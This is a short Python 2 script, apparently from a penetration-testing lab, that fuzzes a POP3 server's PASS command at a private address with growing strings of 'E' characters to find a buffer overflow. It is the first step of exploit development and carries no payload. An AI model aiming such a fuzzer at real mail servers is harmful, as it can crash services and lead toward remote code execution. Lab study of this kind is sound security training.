#!/usr/bin/python

import socket

buffer=["i"]
counter=100
while len(buffer) <= 30:
	buffer.append("E"*counter)
	counter += 200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = sock.connect(("10.11.15.76", 110))
#	sock.recv(1024)
	sock.send("USER test\r\n")
#	sock.recv(1024)
	sock.send("PASS " + string + "\r\n")
	sock.send("QUIT\r\n")
	sock.close()
